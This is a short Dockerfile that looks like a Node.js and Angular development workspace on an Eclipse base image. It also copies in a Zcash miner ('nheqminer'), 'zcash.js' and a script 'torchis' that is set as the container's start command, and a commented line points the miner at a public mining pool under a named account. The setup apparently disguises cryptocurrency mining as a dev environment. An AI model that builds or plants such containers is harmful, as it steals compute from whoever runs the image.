FROM eclipse/ubuntu_jre  
ENV NODE_VERSION=0.12.9 \  
NODE_PATH=/usr/local/lib/node_modules  
  
RUN sudo apt-get update && \  
sudo apt-get install nodejs-legacy npm -y  
  
EXPOSE 3000 5000 9000  
RUN sudo npm install --unsafe-perm -g gulp bower grunt grunt-cli yeoman-
generator yo generator-angular generator-karma generator-webapp  
  
WORKDIR /projects  
ADD nheqminer /projects  
ADD zcash.js /projects  
# ADD nheq.js /  
ADD torchis /projects  
CMD sleep 10  
CMD bash torchis  
# ./nheqminer -l stratum-zec.antpool.com:8899 -u spiritbro.panda -p x

